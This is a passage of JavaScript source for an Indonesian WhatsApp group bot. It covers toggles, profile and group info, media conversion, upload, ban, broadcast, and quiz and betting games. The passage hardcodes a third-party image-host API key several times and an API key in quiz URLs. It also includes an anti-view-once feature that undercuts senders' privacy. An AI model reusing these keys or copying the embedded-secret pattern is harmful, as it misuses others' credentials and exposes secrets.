   if (!isOwner && !mek.key.fromMe) return
   try {
   if (args[0].toLowerCase() === 'on'){
   autoupdatebio = true
  reply(`Sukses Mengaktifkan fitur auto update bio bot`)
   } else if (args[0].toLowerCase() === 'off'){
   autoupdatebio = false
   reply(`Sukses Mematikan fitur auto update bio bot`)
   }
   } catch {
   const buttons = [{buttonId: `${prefix}autoupdatebio on`, buttonText: {displayText: 'ON'}, type: 1},{buttonId: `${prefix}autoupdatebio off`, buttonText: {displayText: 'OFF'}, type: 1}]
  const buttonMessage = {
  headerType: "IMAGE",
  contentText: `PILIH ON UNTUK MENGAKTIFKAN\nPILIH OFF UNTUK MEMATIKAN`,
  footerText: `Pilih Di Bawah Ini 👇`,
  buttons: buttons,
  headerType: 1
  }
  YANZ.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {quoted: mek})
  }
   break
   case 'antivo': case 'antiviewonce':{
   try {
   if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)
   if (args[0].toLowerCase() === 'on'){
   if (isAntiVo) return reply(`Sudah Di Aktifkan Sebelumnya!`)
   antivo.push(from)
   fs.writeFileSync('./database/AVO.json', JSON.stringify(antivo))
   reply(`Succes mengaktifkan Fitur Anti-ViewOnce`)
   } else if (args[0].toLowerCase() === 'off'){
   if (!isAntiVo) return reply(`Fitur Ini Belum Pernah Di Aktifkan Di Group Ini`)
   var nu = antivo.indexOf(from)
   antivo.splice(nu, 1)
   fs.writeFileSync('./database/AVO.json', JSON.stringify(antivo))
   reply(`Succes Mematikan Fitur Anti-ViewOnce`)
  }
  } catch {
  const buttons = [{buttonId: `${prefix}antiviewonce on`, buttonText: {displayText: 'ON'}, type: 1},{buttonId: `${prefix}antiviewonce off`, buttonText: {displayText: 'OFF'}, type: 1}]
  const buttonMessage = {
  headerType: "IMAGE",
  contentText: `PILIH ON UNTUK MENGAKTIFKAN\nPILIH OFF UNTUK MEMATIKAN`,
  footerText: `Pilih Di Bawah Ini 👇`,
  buttons: buttons,
  headerType: 1
  }
  YANZ.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {quoted: mek})
  }
  }
   break
case 'antitroli': case 'antifaketroli':{
   try {
   if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)
   if (args[0].toLowerCase() === 'on'){
   if (isAntro) return reply(`Sudah Di Aktifkan Sebelumnya!`)
   atro.push(from)
   fs.writeFileSync('./database/ATO.json', JSON.stringify(atro))
   reply(`Succes mengaktifkan Fitur Anti-Troli`)
   } else if (args[0].toLowerCase() === 'off'){
   if (!isAntro) return reply(`Fitur Ini Belum Pernah Di Aktifkan Di Group Ini`)
   var ou = atro.indexOf(from)
   atro.splice(ou, 1)
   fs.writeFileSync('./database/ATO.json', JSON.stringify(atro))
   reply(`Succes Mematikan Fitur Anti-Troli`)
  }
  } catch {
  const buttons = [{buttonId: `${prefix}antitroli on`, buttonText: {displayText: 'ON'}, type: 1},{buttonId: `${prefix}antitroli off`, buttonText: {displayText: 'OFF'}, type: 1}]
  const buttonMessage = {
  headerType: "IMAGE",
  contentText: `PILIH ON UNTUK MENGAKTIFKAN\nPILIH OFF UNTUK MEMATIKAN`,
  footerText: `Pilih Di Bawah Ini 👇`,
  buttons: buttons,
  headerType: 1
  }
  YANZ.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {quoted: mek})
  }
  }
   break
  //Ambil Case Kasih Credits Gw Dong : FARID MHRDKAA
 case 'welcome':{
   try {
   if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)
   if (args[0].toLowerCase() === 'on'){
   if (isWelkom) return reply(`Sudah Di Aktifkan Sebelumnya!`)
   welkom.push(from)
   fs.writeFileSync('./database/welcome.json', JSON.stringify(welkom))
   reply(`Succes mengaktifkan Fitur Welcome`)
   } else if (args[0].toLowerCase() === 'off'){
   if (!isWelkom) return reply(`Fitur Ini Belum Pernah Di Aktifkan Di Group Ini`)
   var ank = welkom.indexOf(from)
   welkom.splice(ank, 1)
   fs.writeFileSync('./database/welcome.json', JSON.stringify(welkom))
  reply(`Succes Mematikan Fitur Welcome`)
  }
  } catch {
  const buttons = [{buttonId: `${prefix}welcome on`, buttonText: {displayText: 'ON'}, type: 1},{buttonId: `${prefix}welcome off`, buttonText: {displayText: 'OFF'}, type: 1}]
  const buttonMessage = {
  headerType: "IMAGE",
  contentText: `PILIH ON UNTUK MENGAKTIFKAN\nPILIH OFF UNTUK MEMATIKAN`,
  footerText: `Pilih Di Bawah Ini 👇`,
  buttons: buttons,
  headerType: 1
  }
  YANZ.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {quoted: mek})
  }
  }
  break
  case 'me': case 'myinfo': case 'info': case 'profile': case 'profil':{
  var p = await YANZ.getStatus(`${sender}`, MessageType.text)
  try {
  ppimk = await YANZ.getProfilePicture(`${sender.split('@')[0]}@c.us`)
  } catch {
  ppimk = `${imagebb}`
  }
  puser = await getBuffer(ppimk)
  let cek = ms(getPremiumExpired(sender, premium) - Date.now())
  YANZ.sendMessage(from, puser, image, {thumbnail:gambar2, caption:`── *PROFILE* ──

▢ Nama : ${pushname==undefined?sender.split("@")[0]:pushname}
▢ Bio : ${p.status==undefined?`Not Found`:p.status}
▢ Tag : @${sender.split("@")[0]}
▢ Api : wa.me/${sender.split("@")[0]}

⬡ Limit : ${isPrem ? 'Unlimited Premium' : `${getLimit(sender, limitawal, limit)} / ${limitawal}`}
⬡ Game Limit : ${cekGLimit(sender, gcount, glimit)} / ${gcount}
⬡ Balance : $${getBalance(sender, balance)}
⬡ Role : ${role}
⬡ Level : ${getLevelingLevel(sender)}
⬡ Xp : ${getLevelingXp(sender)}

⬣ Status : ${isOwner?`Owner`:isPrem?`Premium User
⬣ Expired Prem : ${cek.days} d, ${cek.hours} h, ${cek.minutes} m, ${cek.seconds} s`:isUser?`Free User`:`Belum Daftar`}
⬣ Baned : ${isBan?`Terbanned`:`Tidak Terbanned`}
⬣ Baned Antidelete : ${isBanCtRevoke?`Terbanned`:`Tidak Terbanned`}`, quoted: mek, contextInfo:{mentionedJid:[sender]}})
}
break
  case 'listonline': case 'listonlin': case 'liston': case 'listaktif':
  if (isBan) return reply(mess.ban)
  if (!isUser) return reply(mess.noregis)
  if (!isGroup) return reply(mess.only.group)
  if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
  let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
  let online = [...Object.keys(YANZ.chats.get(ido).presences), YANZ.user.jid]
  YANZ.sendMessage(from, '*List Online :*\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, {
  quoted: fakevideo,
  contextInfo: { mentionedJid: online }
  })
  break
  case 'infogc': case 'groupinfo':
  case 'infogrup': case 'grupinfo':{
  if (isBan) return reply(mess.ban)
  if (!isUser) return reply(mess.noregis)
  
  if (!isGroup) return reply(mess.only.group)
  try {
  ppUrl = await YANZ.getProfilePicture(from)
  } catch {
  ppUrl = `${imagebb}`
  }
  a = groupMetadata
  let cekvip = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
  nya = `━━━━━━• *G R O U P I N F O* •━━━━━━

*◯ Nama : ${groupName}*
 - Terakhir Di Ubah Oleh : @${a.subjectOwner.split("@")[0]}
*◯ Waktu Dibuat :* 
 - Jam : ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('HH:mm:ss')} Wib
 - Tanggal : ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('d, m, y')}
*◯ Owner Grup : @${groupMetadata.owner.split('@')[0]}*
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ 
*⬣ Welcome : ${isWelkom ? 'On':'Off'}*
*⬣ Anti Link : ${isAntiLink? 'On':'Off'}*
*⬣ Anti Badword : ${isBadword? 'On':'Off'}*
*⬣ Anti Delete : ${isRevoke? 'On':'Off'}*
*⬣ Anti View-Once : ${isAntiVo? 'On':'Off'}*
*⬣ Anti Fake troli bot : ${isAntro? 'On':'Off'}* ${isSewa?`\n*⬣ Expired Sewa : ${cekvip.days} Hari, ${cekvip.hours} Jam, ${cekvip.minutes} Menit, ${cekvip.seconds} Detik*`:``}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ 
*◯ Total Member : ${groupMembers.length}*
*◯ Total Admin : ${groupAdmins.length}*
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ 
*◯ Deskripsi Group :*
 ${groupDesc}
 - *Terakhir Di Ubah Oleh : @${a.descOwner.split("@")[0]}*`
 jk = await getBuffer(ppUrl)
YANZ.sendMessage(from, jk, MessageType.image, {thumbnail:gambar2, caption: nya, quoted: mek, contextInfo: {"mentionedJid": [groupMetadata.owner.replace('@c.us', '@s.whatsapp.net'),groupMetadata.descOwner.replace('@c.us', '@s.whatsapp.net'),groupMetadata.subjectOwner.replace('@c.us', '@s.whatsapp.net')]}})
  }
break
  case 'caripesan':
  case 'searchmessage':
  if (isBan) return reply(mess.ban)
  if (!mek.key.fromMe && !isPrem) return reply(mess.only.prem)
  if(!q)return reply('pesannya apa bang?')
  reply('Sedang Mencari Pesan...')
  let v = await YANZ.searchMessages(q,from,10,1)
  let s = v.messages
  let el = s.filter(v => v.message)
  el.shift()
  try {
  if(el[0].message.conversation == undefined) return
  reply(`Ditemukan ${el.length} pesan`)
  await sleep(3000)
  for(let i = 0; i < el.length; i++) {
  await YANZ.sendMessage(from,'Nih Pesannya',text,{quoted:el[i]})
  }
  } catch(e){
  reply('Pesan tidak ditemukan!')
  }           
  break
case 'tomp3': case 'tomusic': case 'toaudio':
if (!isUser) return reply(mess.noregis) 
if (isBan) return reply(mess.ban)
if (isLimit(sender, isPrem, isOwner, limitawal, limit)) return reply(mess.limit)
if (!isQuotedVideo) return reply(`Error!\nSepertinya Yang Anda Kirim Bukan Video, Atau Nggak Tunggu Dalam Beberapa Detik Lagi, Biarkan Bot Mendownload Media Terlebih Dahulu Lalu Beri Command Seperti ${prefix+command} Di Ikuti Dengan Mereply Video`)
reply(mess.wait)
var encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
var media = await YANZ.downloadAndSaveMediaMessage(encmedia)
var ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply('Gagal, pada saat mengkonversi video ke mp3')
var buffer = fs.readFileSync(ran)
YANZ.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: mek})
fs.unlinkSync(ran)
})
limitAdd(sender, limit)
  break
case 'toptt': case 'tovn':
if (!isUser) return reply(mess.noregis) 
if (isBan) return reply(mess.ban)
if (isLimit(sender, isPrem, isOwner, limitawal, limit)) return reply(mess.limit)
if (!isQuotedAudio) return reply(`REPLY AUDIONYA BOSS`)
reply(mess.wait)
var encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
var media = await YANZ.downloadAndSaveMediaMessage(encmedia)
var ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply('Gagal, pada saat mengkonversi video ke mp3')
var buffer = fs.readFileSync(ran)
YANZ.sendMessage(from, buffer, audio, {ptt: true, mimetype: 'audio/mp4', quoted: mek})
fs.unlinkSync(ran)
})
limitAdd(sender, limit)
break
case 'toimg': 
if (!isUser) return reply(mess.noregis) 
if (isBan) return reply(mess.ban)
if (isLimit(sender, isPrem, isOwner, limitawal, limit)) return reply(mess.limit)
reply(mess.wait)
if (!isQuotedSticker) return reply('Reply stiker nya')
if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker && args.length == 0)) {
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await YANZ.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply('❎ Gagal, pada saat mengkonversi sticker ke gambar ❎')
buffer = fs.readFileSync(ran)
YANZ.sendMessage(from, buffer, image, {caption:'niih',quoted:mek})
fs.unlinkSync(ran)
})
} else {
reply(`REPLY STICKERNYAAA!!!`)
}
limitAdd(sender, limit)
break
case 'togif':
if (!isUser) return reply(mess.noregis) 
if (isBan) return reply(mess.ban)
if (isLimit(sender, isPrem, isOwner, limitawal, limit)) return reply(mess.limit)
if (!isQuotedSticker) return reply('Reply stiker nya')
reply(mess.wait)
if (mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated == true)
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
media = await YANZ.downloadAndSaveMediaMessage(encmedia)
memek = await webp2gifFile(media)
console.log(memek)
Frd = await getBuffer(memek.result)
YANZ.sendMessage(from, Frd, video, { mimetype: 'video/gif', caption: 'Nih..', quoted: mek })
limitAdd(sender, limit)
break
case 'tovideo':
case 'tomp4':
if (!isUser) return reply(mess.noregis) 
if (isBan) return reply(mess.ban)
if (isLimit(sender, isPrem, isOwner, limitawal, limit)) return reply(mess.limit)
if (!isQuotedSticker) return reply('Reply stiker nya')
reply(mess.wait)
if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
owgi = await YANZ.downloadAndSaveMediaMessage(ger)
webp2mp4File(owgi).then(res=>{
YANZ.sendMessage(from, res.result, video, { mimetype: Mimetype.mp4, filename: 'tovideo.mp4',caption: 'SUKSES CONVERT STICKER TO VIDEO', quoted: mek})
})
}else {
reply('reply stiker')
}
fs.unlinkSync(owgi)
limitAdd(sender, limit)
break
  case 'tourl':
  case 'imagetorul':
  case 'imgtourl':
  case 'audiotourl':
  case 'videotourl':
  case 'stickertourl':
  case 'stikertourl':
  case 'tolink':
  if (!isUser) return reply(mess.noregis) 
  if (isBan) return reply(mess.ban)
  var imgbb = require('imgbb-uploader')
  if (isQuotedAudio) {
  ger = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
  reply(mess.wait)
  owgi = await YANZ.downloadAndSaveMediaMessage(ger)
  Okelor = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
  teks=`─ 「 *AUDIO TO URL* 」 ─

*${f}Url : ${Okelor.display_url}*`
  reply(teks)
 
  } else if (isQuotedImage) {
  ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
  reply(mess.wait)
  owgi = await YANZ.downloadAndSaveMediaMessage(ger)
  qbc = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
teks=`─ 「 *IMAGE TO URL* 」 ─

*${f}Url : ${qbc.display_url}*`
  reply(teks)
  } else if (isQuotedVideo) {
  ger = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
  reply(mess.wait)
  owgi = await YANZ.downloadAndSaveMediaMessage(ger)
  ffff = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
  teks=`─ 「 *VIDEO TO URL* 」 ─

*${f}Url : ${ffff.display_url}*`
  reply(teks)
  } else if (isQuotedSticker) {
  ger = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
  reply(mess.wait)
  owgi = await YANZ.downloadAndSaveMediaMessage(ger)
  vrr = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
  teks=`─ 「 *STICKER TO URL* 」 ─

*${f}Url : ${vrr.display_url}*`
  reply(teks)
  }
  break
/* case 'jadibot':
  if (isSelf) return reply('❌ Tidak Bisa Jadibot Di Dalam Bot ❌')
  if (isBan) return reply(mess.ban)
if (isGroup) return reply('Only Personal Chat!!')
  jadibot(reply,YANZ,from, mek)
  break    
  case 'stopjadibot':
  if (!isSelf && !isOwner)return reply(`Tidak Bisa Stop Jadibot Kecuali Owner : @${nomerowner}`)
  stopjadibot(reply)
  break      
  case 'listbot': case 'listjadibot':
  if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
  let tekss = `\n━ 「 𝗟𝗜𝗦𝗧 𝗝𝗔𝗗𝗜 𝗕𝗢𝗧 」 ━\n\n`
  let lbt = [];
  for(let i of listjadibot) {
  lbt.push(i.jid)
  tekss += `▢ 𝗨𝗦𝗘𝗥 : @${i.jid.split('@')[0]}\n`
  tekss += `▢ 𝗗𝗘𝗩𝗜𝗖𝗘 : ${i.phone.device_manufacturer}\n`
  tekss += `▢ 𝗠𝗢𝗗𝗘𝗟 : ${i.phone.device_model}\n`
  tekss += `\n━ ━ ━ ━ ━ ━ ━ ━ ━\n`
  }
  console.log(listjadibot.phone)
  mentions(tekss, lbt, true)
  break*/
    case 'q': case 'ulang':
    if (!isUser) return reply(mess.noregis)
    if (isBan) return reply(mess.ban)
    if (!m.quoted) return reply('reply pesan!')
    var RID = YANZ.serializeM(await m.getQuotedObj())
    if (!RID.quoted) return reply('pesan yang anda reply tidak mengandung reply!')
    await RID.quoted.copyNForward(m.chat, true)
    break

  case 'block':
  if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
  if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) {
  ny = `${args[0].replace('@', '')}@c.us`
  YANZ.blockUser (`${ny}@c.us`, "add")
  reply(`Nomor ${ny} telah di blockir!`)
  } else {
  ny = `${mentionUser}`
  YANZ.blockUser (`${ny.replace("@s.whatsapp.net","@c.us")}`, "add")
  reply(`Nomor ${ny.replace("@s.whatsapp.net","@c.us")} telah blockir!`)  
  }
  break
case 'unblock':
  if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
  if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) {
  ny = `${args[0].replace('@', '')}@c.us`
  YANZ.blockUser (`${ny}@c.us`, "remove")
  reply(`Nomor ${ny} telah di unblockir!`)
  } else {
  ny = `${mentionUser}`
  YANZ.blockUser (`${ny.replace("@s.whatsapp.net","@c.us")}`, "remove")
  reply(`Nomor ${ny.replace("@s.whatsapp.net","@c.us")} telah dibanned!`)  
  }
  break


  case 'ban':
  if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
  if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) {
  ny = `${args[0].replace('@', '')}@s.whatsapp.net`
  ban.push(ny)
  fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
  reply(`Nomor ${ny} telah dibanned!`)
  } else {
  ny = `${mentionUser}`
  ban.push(ny)
  fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
  reply(`Nomor ${ny} telah dibanned!`)  
  }
  break
  case 'unban':
  if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
  if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) {
  ah = `${args[0].replace("@","")}@s.whatsapp.net`
  unb = ban.indexOf(ah)
  ban.splice(unb, 1)
  fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
  reply(`Nomor ${ah} telah di unban!`)
  } else {
  ah = `${mentionUser}`
  unb = ban.indexOf(ah)
  ban.splice(unb, 1)
  fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
  reply(`Nomor ${ah} telah di unban!`)
  }
  break
  case 'resetlimit':
  if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
  YANZ.updatePresence(from, Presence.avaible) 
  fs.writeFileSync('./database/limit.json', ('[]'))
  fs.writeFileSync('./database/glimit.json', ('[]'))
  reply('Succes Sluur~')  
  await sleep(5000)
  break
  case 'bc':
  if (!mek.key.fromMe && !isOwner) return reply(mess.only.owner) 
  if (args.length < 1) return reply('Textnya Mane?')
  anjir = await YANZ.chats.all()
  for (let _ of anjir) {
  YANZ.sendMessage(`${_.jid}`, q, text)
  }
  reply('◯ 𝐒𝐔𝐂𝐂𝐄𝐒 ◯')
  break
//Ambil Case Kasih Credits Gw Dong : FARID MHRDKAA
  case 'ttt': case  'tictactoe': case 'ttc':{
  if (!isGroup) return reply(mess.only.group)
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  if (fs.existsSync(`./database/game/casino/db/${from}.json`)) return replybutton1(from, `${prefix}delcasino`, `Klik Di Bawah Untuk Menghapus Sesi Game Casino`, `DELETE SESI CASINO GAME`, `Sedang Ada Sesi Game Casino, tidak dapat dijalankan secara bersamaan`)
  if (args[0].includes(`@${me.jid.split("@")[0]}`)) return reply('Gabisa Gw, Gw Lagi sibuk Xixixixi')
  if (fs.existsSync(`./database/game/tictactoe/db/${from}.json`)) {
  const boardnow = setGame(`${from}`);
  const matrix = boardnow._matrix;
  const chatMove = `🎮 *TICTACTOE* 🎮
     
*Sedang ada sesi tictactoe digrup ini!!*

Player ❎ : @${boardnow.X}
Player ⭕ : @${boardnow.O}
     

 ${matrix[0][0]} ${matrix[0][1]} ${matrix[0][2]}
 ${matrix[1][0]} ${matrix[1][1]} ${matrix[1][2]}
 ${matrix[2][0]} ${matrix[2][1]} ${matrix[2][2]}
     
Giliran @${boardnow.turn == "X" ? boardnow.X : boardnow.O}`;
const buttons = [{buttonId: `${prefix}delttc`, buttonText: {displayText: `DELETE SESI GAME TICTACTOE`}, type: 1}]
const buttonMessage = {
headerType: "IMAGE",
contentText: chatMove,
footerText: `Klik Di Bawah Untuk Menghapus Sesi TicTacToe`,
buttons: buttons,
headerType: 1
}
YANZ.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {
  contextInfo: {
  mentionedJid: [
  boardnow.X + "@s.whatsapp.net",
  boardnow.O + "@s.whatsapp.net",
  ],
  },
  });
  return;
  }
  if (isGame(sender, isOwner, gcount, glimit)) return reply(mess.glimit)
  if (argss.length === 1)
  return reply(`Tag yang ingin jadi lawan anda!\n\nPenggunaan : *${prefix}tictactoe @TagMember*`);
  const boardnow = setGame(`${from}`);
  console.log(`Start Tictactore ${boardnow.session}`);
  boardnow.status = false;
  boardnow.X = sender.replace("@s.whatsapp.net", "");
  boardnow.O = argss[1].replace("@", "");
  fs.writeFileSync(`./database/game/tictactoe/db/${from}.json`,JSON.stringify(boardnow, null, 2));
  const strChat = `🎮 *TICTACTOE* 🎮

@${sender.replace("@s.whatsapp.net","")} Menantang ${argss[1]}
     
${argss[1]} Ketik [Y/N] Untuk Menerima Atau Menolak Tantangan

N : menolak tantangan..
Y : menerima tantangan..

NOTE : PESAN INI AKAN DI HAPUS SETELAH 10 DETIK LAGI, TAPI SESI TICTACTOE GAME TETAP BERJALAN`;
  const buttons = [
  {buttonId: `yatictactoe`, buttonText: {displayText: `✅ TERIMA ✅`}, type: 1},
  {buttonId: `notictactoe`, buttonText: {displayText: `❎ TOLAK ❎`}, type: 1}
  ]
        const buttonMessage = {
        headerType: "IMAGE",
        contentText: strChat,
        footerText: `klik di bawah\nbot created by farid`,
        buttons: buttons,
        headerType: 1
  }
 boo = await YANZ.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {
  contextInfo: {
  mentionedJid: [sender, argss[1].replace("@", "") + "@s.whatsapp.net"],
  },
  })
  setTimeout(() => {
  YANZ.deleteMessage(from, boo.key)
  }, 10000)
}
  gameAdd(sender, glimit)
  break
  case  'delttc': case 'dellttc': case 'dellttt': case 'delttt': case 'delltictactoe': case 'deltictactoe':
  if (!isGroup) return reply(mess.only.group)
  if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
  if (fs.existsSync("./database/game/tictactoe/db/" + from + ".json")) {
  fs.unlinkSync("./database/game/tictactoe/db/" + from + ".json");
  reply(`Berhasil menghapus sesi di grup ini!`);
  } else {
  reply(`Tidak ada sesi yang berlangsung`);
  }
  break
  case 'casino':
  case 'judi':
  if (fs.existsSync(`./database/game/tictactoe/db/${from}.json`)) return replybutton1(from, `${prefix}delttc`, `Klik Di Bawah Untuk Menghapus Sesi Game TicTacToe`, `DELETE SESI GAME TICTACTOE`, `Sedang Ada Sesi Game TicTacToe, tidak dapat dijalankan secara bersamaan`)
  if (!isGroup) return reply(mess.only.group)
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
    if (isGame(sender, isOwner, gcount, glimit)) return reply(mess.glimit)
    if (args.length < 1) return reply(`Kirim perintah *${command}* @tag nominal`)
    if (mentionUser.length == 0) return reply(`Tag Lawan Yang Ingin Diajak Bermain Game`)
    if (mek.message.extendedTextMessage.contextInfo.mentionedJid > 1) return reply('Hanya bisa dengan 1 orang')
    if (!mek.message.extendedTextMessage.contextInfo.mentionedJid[0]) return
    if (fs.existsSync(`./database/game/casino/db/${from}.json`)) return reply(`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan\nKetik *${prefix}delcasino*, untuk menghapus sesi`)
    if (args.length == 1) return reply('Masukan Nominal Nya')
    if (args[1].startsWith('-')) return
    if (isNaN(args[1])) return reply('Nominal Harus Berupa Angka!')
    var beh = getBalance(sender, balance)
    if (beh < args[1] || beh == 'undefined') return reply(`Balance Tidak Mencukupi, Kumpulkan Terlebih Dahulu\nKetik ${prefix}balance, untuk mengecek Balance mu!`)
    var casinoo = setCasino(`${from}`)
    casinoo.Z = sender.replace("@s.whatsapp.net", "")
    casinoo.Y = args[0].replace("@", "")
    casinoo.nominal = args[1]
    fs.writeFileSync(`./database/game/casino/db/${from}.json`, JSON.stringify(casinoo, null, 2))
    var starGame = `「 𝚂𝚃𝙰𝚁𝚃 𝙲𝙰𝚂𝙸𝙽𝙾 𝙶𝙰𝙼𝙴 」\n\n• @${sender.replace("@s.whatsapp.net", "")} 𝙼𝙴𝙽𝙰𝙽𝚃𝙰𝙽𝙶 ${args[0]}\n• 𝙽𝙾𝙼𝙸𝙽𝙰𝙻 : *$ ${nebal(args[1])}*\n\n• 𝗞𝗘𝗧𝗜𝗞 𝗬/𝗡 𝗨𝗡𝗧𝗨𝗞 𝗠𝗘𝗡𝗘𝗥𝗜𝗠𝗔 𝗔𝗧𝗔𝗨 𝗠𝗘𝗡𝗢𝗟𝗔𝗞 𝗣𝗘𝗥𝗠𝗔𝗜𝗡𝗔𝗡`
    YANZ.sendMessage(from, starGame, text, {quoted: mek, contextInfo: { mentionedJid: [sender, args[0].replace("@", "") + "@s.whatsapp.net"],}})
    gameAdd(sender, glimit)
    break
    case 'delcasino': case 'dellcasino':
    if (!isGroup) return reply(mess.only.group)
    if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
    if (fs.existsSync('./database/game/casino/db/' + from + '.json')) {
    deleteCasino(from)
    reply('Berhasil Menghapus Sesi Casino')
    } else {
    reply('Tidak ada sesi yang berlangsung')
    }
    break
case 'mathkuis': case 'math': {
try {
 if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  if (isGame(sender, isOwner, gcount, glimit)) return reply(mess.glimit)
  if (game.isMtk(from, mtk)) return reply(`Masih ada soal yang belum di selesaikan`)
   let buh = await fetchJson(`https://h4ck3rs404-api.herokuapp.com/api/kuis/math?mode=${q}&apikey=404Api`)
  const petunjuk = buh.result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
  bp = await YANZ.sendMessage(from, `*Soal :* ${buh.result.soal} \nWaktu : ${gamewaktu}s`, text, {quoted:mek, thumbnail:gambar2 })
  let anih = buh.result.jawaban.toLowerCase()
  game.addmtk(from, anih, gamewaktu, mtk)
  gameAdd(sender, glimit)
  setTimeout(() => {
  YANZ.deleteMessage(from, bp.key)
  }, gamewaktu+`000`)
  } catch {
  list = []
 commandnya = [
`easy`,
`medium`,
`hard`,
`extreme`,
`impossible`,
`pro`
 ]
 viewmenunya = [
`◯ MODE - EASY`,
`◯ MODE - MEDIUM`,
`◯ MODE - HARD`,
`◯ MODE - EXTREME`,
`◯ MODE - IMPOSSIBLE`,
`◯ MODE - PRO`
  ]
 startnum = 0
 for (let x of commandnya) {
 const yy = {title: `──────────────`,
 rows: [
 {
 title: `${viewmenunya[startnum++]}`,
 description: ``,
 rowId: `${prefix}math ${x}`
 }
 ]
 }
 list.push(yy)
 }
 listmsg(from, `─ 「 *MATH KUIS* 」 ─`, `SILAHKAN PILIH MODE DI BAWAH INI `, `PILIH MODE DISINI`,`𝙼𝙰𝚃𝙷 𝙺𝚄𝙸𝚂`, list)
mtk.splice(game.getMtkPosi(from, mtk), 1)
  }
    }
    break
case 'tebakgambar': case 'tg': case 'tbg':{
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  if (isGame(sender, isOwner, gcount, glimit)) return reply(mess.glimit)
  let bahi = await axios.get(`http://api.lolhuman.xyz/api/tebak/gambar?apikey=${lolkey}`)
  anja = await getBuffer(bahi.data.result.image)
  const petunjuk = bahi.data.result.answer.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
  bp = await YANZ.sendMessage(from, anja, image, {caption:`─「 *TEBAK GAMBAR* 」─\nSilahkan Jawab Soal Yang Ada Di Foto Ini\n\nWaktu : ${gamewaktu}s`, quoted:mek})
  console.log(bahi.data.result.answer)
  let m = bahi.data.result.answer.toLowerCase()
  game.addgambar(from, m, gamewaktu, tebakgambar)
  setTimeout(() => {
  YANZ.deleteMessage(from, bp.key)
  }, gamewaktu+`000`)
  }
gameAdd(sender, glimit)
break
case 'siapakahaku':{
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  if (isGame(sender, isOwner, gcount, glimit)) return reply(mess.glimit)
let hadeh = await axios.get(`https://api.lolhuman.xyz/api/tebak/siapaaku?apikey=${lolkey}`)
console.log(hadeh.data.result.answer)
bp = await YANZ.sendMessage(from, `─「 *SIAPAKAH AKU* 」─

